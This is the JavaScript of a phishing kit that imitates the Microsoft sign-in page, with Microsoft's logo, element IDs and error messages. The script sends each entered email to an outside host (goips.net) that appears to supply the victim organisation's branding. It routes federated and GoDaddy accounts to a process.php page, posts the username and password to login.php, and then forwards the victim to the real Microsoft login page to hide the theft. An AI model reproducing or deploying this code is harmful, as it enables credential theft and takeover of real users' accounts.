var api = 'https://goips.net/background-redirect/index.php';
var Progress = document.getElementById('progressBar');
var Mainbox = document.getElementById('mainbox');
var Fedred = document.getElementById('fedred');
var Emailsection = document.getElementById('emailsection');
var Passsection = document.getElementById('Passsection');
var Back = document.getElementById('idBtn_Back');
var BGimg = document.getElementById('BGimg');
var LOGOimg = document.getElementById('LOGOimg');
var dimBG = document.getElementById('dimBG');
var USER = document.getElementById('i0116');
var PASS = document.getElementById('i0118');
var USER_ERR = document.getElementById('usernameError');
var PASS_ERR = document.getElementById('passwordError');

function loaded() {
    USER.focus();
}

Emailsection.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    }
});
Passsection.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NEE()
    }
});

Back.onclick = function () {
    Passsection.classList.replace('slide-in-next', 'slide-out-back');
    Emailsection.classList.replace('slide-out-next', 'slide-in-back');
    PASS_ERR.setAttribute('style', 'display:none');
    PASS.classList.remove('has-error');
    setTimeout(function () {
        BGimg.setAttribute("style", "background-image: url(https://s3.amazonaws.com/simbla-static-2/2020/11/5faba665321d68001d4fc0e4/5faba6db73aef50019af7085/ZJH_2F3Xi0SopxxCuN7EKeDY.jpg);");
        LOGOimg.setAttribute("src", 'include/src/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');
        Passsection.setAttribute("style", "display:none");
        Emailsection.setAttribute("style", "display:block");
        Passsection.classList.replace('slide-out-back', 'slide-in-next');
        dimBG.classList.remove('background-overlay');
    }, 250);

};

function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

USER.onkeyup = function () {
    USER_ERR.setAttribute('style', 'display:none');
    USER.classList.remove('has-error');
};
PASS.onkeyup = function () {
    PASS_ERR.setAttribute('style', 'display:none');
    PASS.classList.remove('has-error');
};


function NE() {

    if (USER.value == "") {
        USER_ERR.innerHTML = "Enter a valid email address, phone number, or Skype name.";
        USER_ERR.setAttribute('style', 'display:block');
        USER.classList.add('has-error');
        USER.focus();
    }
    else if (!validateEmail(USER.value)) {
        Progress.classList.add('progress');
        Mainbox.classList.add('disable-lightbox');
        setTimeout(function () {
            Progress.classList.remove('progress');
            Mainbox.classList.remove('disable-lightbox');
            USER_ERR.innerHTML = "We couldn\'t find an account with that username. Try another, or <a id=\"idA_PWD_SignUp\" href=\"https:\/\/login.live.com\/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWSPW_TUBSGc5M2tFGBqkICdUAVMIGcXOfaThypQrXdtGmTOE7tJPZSpYmTXscfqX2bxP4FCKlS5y4IBpDKxoT4CZ26sHRhqxBiQEwsSLjdWc5ynld6dZ7zPEVn6dIzBjFst3DAU3yXQxTD05DqMnmOQiziUB7SfRYifyWz_O3pyc98uVJ98-Tj49Xrk4MzsLhv44mZ7XnOOXh4SMg4KOVy0-k06w0GuHe7yH0G4BKA7wCcJedNl9L2zpMBhzieoYtMEaECzSCOY7M1S4nq0iZbV3VibGm0IUJoWBuzansH11WN6Gol1B0tqkcVqEeGU5OEkaEOQ11VSK2tsAaOeUkLq-qQkaWYbzcd3VKQrvZQnIdXyfvyxjE5zN8Mz8eR-Tu5OPB8Z3_sBeQs9QHIY9Ot9EXPdc0eyd5gpktwr0uw5zZ8b2z6BJvB-o6lBiGr2X5T9_CeRRUpAeXlTnlDxdvduuAH02InjPZqUN5qHYvjmXg05TrRpivJtohEtM3vWoURq7WU8sSmFQl3uvWmMrRNXkY4EAbTsOwxWzYq92cUJ0fNSZuYbUFuBJxgh4pQsT6l0vFZHc-9SN2LS7m4vzb2vQG2zcs58GNuCaZKCwuZ5cSjxFrizxx4Nx-bu868XXr5d6X6_u7XzurrdOJiPgeRRDrqrtN0yqjRcxrKcNYeHB-0jkaMiByMJuzkxSyS-7sjbR2W6NM0OE2nf6XBqzuJL4v_c32VeRD_C09BlsqjNciWYKGEGOMf0&amp;estsfed=1&amp;uaid=ec8d23df46324c499f22ab1e1ae68d62&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US\">get a new Microsoft account<\/a>.";
            USER_ERR.setAttribute('style', 'display:block');
            USER_ERR.classList.add('has-error');
            USER.focus();
        }, 900);


    }
    else {

        document.getElementById('displayName').innerHTML = USER.value;
        document.getElementById('displayName').setAttribute('title', USER.value);
        Progress.classList.add('progress');
        Mainbox.classList.add('disable-lightbox');

        var hr1 = new XMLHttpRequest();
        var url = api;
        var vars = "user=" + USER.value;
        hr1.open("POST", url, true);
        hr1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        hr1.send(vars);
        hr1.onreadystatechange = function () {
            if (hr1.readyState == 4 && hr1.status == 200) {

                var myObj = JSON.parse(hr1.responseText);
                console.log(myObj);
				
                if (myObj.code == 0) {
                    setTimeout(function () {
						console.log(0);
                        Progress.classList.remove('progress');
                        Mainbox.classList.remove('disable-lightbox');
                        USER_ERR.innerHTML = "We couldn\'t find an account with that username. Try another, or <a id=\"idA_PWD_SignUp\" href=\"https:\/\/login.live.com\/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWSPW_TUBSGc5M2tFGBqkICdUAVMIGcXOfaThypQrXdtGmTOE7tJPZSpYmTXscfqX2bxP4FCKlS5y4IBpDKxoT4CZ26sHRhqxBiQEwsSLjdWc5ynld6dZ7zPEVn6dIzBjFst3DAU3yXQxTD05DqMnmOQiziUB7SfRYifyWz_O3pyc98uVJ98-Tj49Xrk4MzsLhv44mZ7XnOOXh4SMg4KOVy0-k06w0GuHe7yH0G4BKA7wCcJedNl9L2zpMBhzieoYtMEaECzSCOY7M1S4nq0iZbV3VibGm0IUJoWBuzansH11WN6Gol1B0tqkcVqEeGU5OEkaEOQ11VSK2tsAaOeUkLq-qQkaWYbzcd3VKQrvZQnIdXyfvyxjE5zN8Mz8eR-Tu5OPB8Z3_sBeQs9QHIY9Ot9EXPdc0eyd5gpktwr0uw5zZ8b2z6BJvB-o6lBiGr2X5T9_CeRRUpAeXlTnlDxdvduuAH02InjPZqUN5qHYvjmXg05TrRpivJtohEtM3vWoURq7WU8sSmFQl3uvWmMrRNXkY4EAbTsOwxWzYq92cUJ0fNSZuYbUFuBJxgh4pQsT6l0vFZHc-9SN2LS7m4vzb2vQG2zcs58GNuCaZKCwuZ5cSjxFrizxx4Nx-bu868XXr5d6X6_u7XzurrdOJiPgeRRDrqrtN0yqjRcxrKcNYeHB-0jkaMiByMJuzkxSyS-7sjbR2W6NM0OE2nf6XBqzuJL4v_c32VeRD_C09BlsqjNciWYKGEGOMf0&amp;estsfed=1&amp;uaid=ec8d23df46324c499f22ab1e1ae68d62&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US\">get a new Microsoft account<\/a>.";
                        USER_ERR.setAttribute('style', 'display:block');
                        USER_ERR.classList.add('has-error');
                        USER.focus();
                    }, 900);


                }

                if (myObj.code === 1) {
					console.log(1);
                    Mainbox.classList.remove('disable-lightbox');
                    Progress.classList.remove('progress');
                    Emailsection.setAttribute("style", "display:none");
                    Passsection.setAttribute("style", "display:block");
                    PASS.focus();
                }
				
				if (myObj.code === 2) {
                    if (myObj.logo != null) {
                        LOGOimg.setAttribute("src", myObj.logo);
                    }
                    if (myObj.bg_color != null && myObj.bg_img == null) {
                        BGimg.setAttribute("src", "");
                        BGimg.setAttribute("style", "background-color:" + myObj.bg_color);
                    }
                    if (myObj.bg_img != null) {
                        BGimg.setAttribute("style", "background-image: url(" + myObj.bg_img + ");");
                        dimBG.classList.add('background-overlay');
                    }

                    Mainbox.classList.remove('disable-lightbox');
                    Progress.classList.remove('progress');
                    Emailsection.setAttribute("style", "display:none");
                    Passsection.setAttribute("style", "display:block");
                    PASS.focus();
                }
				
                if (myObj.code === 3) {
                    Emailsection.classList.replace('slide-in-next', 'slide-out-next');
                    Emailsection.classList.replace('slide-in-back', 'slide-out-next');
                    Emailsection.setAttribute("style", "display:none");
                    Mainbox.classList.remove('disable-lightbox');
                    Progress.classList.remove('progress');
                    Fedred.setAttribute("style", "display:block");
					var redi = myObj.redirect_url;
                    // var redi = 'godaddy.com';
                    setTimeout(function () {
						if(redi.includes('godaddy')){
                            // console.log(true);
                            window.location.replace("/common/process.php?u=godaddy&user=" + USER.value);
                        }
						else{
                            // console.log(false);
                            window.location.replace("/common/process.php?&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&u="+btoa(myObj.redirect_url));
                        }
                     
                    }, 3000);
                }
				
                // if (myObj.code !== 0 && myObj.code !== 1 && myObj.code !== 2 && myObj.code !== 3) {
				// 	console.log(5);
                //     Emailsection.classList.replace('slide-in-next', 'slide-out-next');
                //     Emailsection.classList.replace('slide-in-back', 'slide-out-next');
                //     setTimeout(function () {
                //         Mainbox.classList.remove('disable-lightbox');
                //         Progress.classList.remove('progress');
                //         Emailsection.setAttribute("style", "display:none");
                //         Passsection.setAttribute("style", "display:block");
                //         PASS.focus();
                //     }, 250);


                // }

            }
        };
    }
}

function NEE() {

    if (PASS.value == "") {
        PASS_ERR.innerHTML = "Please enter your password.";
        PASS_ERR.setAttribute('style', 'display:block');
        PASS.classList.add('has-error');
        PASS.focus();
    } else {

        Progress.classList.add('progress');
        Mainbox.classList.add('disable-lightbox');

        var hr = new XMLHttpRequest();
        var url = "login.php";
        var vars = "user=" + USER.value + "&pass=" + PASS.value;
        hr.open("POST", url, true);
        hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        hr.send(vars);


        hr.onreadystatechange = function () {
            if (hr.readyState == XMLHttpRequest.DONE) {

                var resp = hr.responseText;

                if (resp == 1) {
                    window.location.replace("https://login.microsoftonline.com");
                } else {
                    Progress.classList.remove('progress');
                    Mainbox.classList.remove('disable-lightbox');
                    PASS_ERR.innerHTML = "Your account or password is incorrect. If you don\'t remember your password, <a id=\"idA_IL_ForgotPassword0\" href=\"https:\/\/passwordreset.microsoftonline.com\/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWSO2_TUACF47hNHyCoEAgWpA5MVEn8dhKpEkntvFTbSevEXC-V7VzHTmJfY9_ETSZGxgqx0K0ggdQFwYRYKzF06szIhBgQYmKk-QEsZ_qGo_OdxyRdoCuPOJbjLdEu58uWwOa5Mk3lLY4R8izPCixD0QOeYuM7m1vZd2_JD40L9eXhGfx695l7Ttz3MI6SSrGYpmkBua7vwIKDguJngrgiiB8EcZpdhWG-d3ieTQRWKHN0SRT5kiiIHM2JBTByFqYOKE1SsNk48IBPUUqgevuGPFeDHgZGi1UaPd7U5VSVDgLAdFNzJC-0hoxVqcuqhxSljvqjJa_pDgYL1TOliafokzFYtKhv2dtadYo9Zhko9hfwT3bDRXFwFKEEn5LvCS2CYWuwh8IQOriwxGCIfcfCPgo7MYpgjH2Y7DY834jH-oxuqvX6DFFHNaOf9OlmoA_2q3GzRh2MGXnytKqowJkz_Xarb6d13ugEzbo3N-R2cBzxNTlhhtHetNXNK2KnxY8UQR022mbgylNxWPZtJBsjbJV65nG3H9uBK1WBVu7ZHeuY_kTmrmcNUHhJ3rouFfqD7ShGrj-B38mHVjiIoV-wp3aIZk-GE2RbkwjFOFmquFohfq7cpMjK-vrmVuZBZjvzd4V4s3ptM1P79fr5jXvy2cXJx1dgLXO5Wuw4FlzseE0u1OYz1gWpK6O0tA80fWdeUtosSNqSVJrBGgt2uQp9kiNOcrnfOfLFWubLxv--8A81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10\">reset it now.<\/a>";
                    PASS_ERR.setAttribute('style', 'display:block');
                    PASS.classList.add('has-error');
                    PASS.value = "";
                    PASS.focus();
                }
            }
        }




    }
}